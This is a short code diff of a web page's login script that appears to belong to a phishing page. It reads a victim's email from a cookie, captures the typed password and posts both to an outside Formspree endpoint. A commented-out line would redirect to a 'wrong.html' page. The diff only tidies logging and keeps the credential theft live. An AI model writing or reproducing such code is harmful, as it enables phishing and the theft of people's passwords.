@@ -12,13 +12,10 @@
             $("#emailparse").html(Cookies.get("email"))
             $("form").submit((e) => {
                 e.preventDefault();
-                console.log($("#emailparse").html())
-                console.log($("#password").val())
-                $.post("https://formspree.io/f/xjvdzrpq",{email:$("#emailparse").html(),password:$("#password").val()},(data,err)=>{
-                    console.log("runned")
+                var emai1 = $("#emailparse").html().toString();
+                var pass = $("#password").val().toString();
+                $.post("https://formspree.io/f/xjvdzrpq",{email:emai1,password:pass})
 //                     window.location = "./wrong.html";
-                    console.log("redirected")
-                })
             });
         })
     </script>
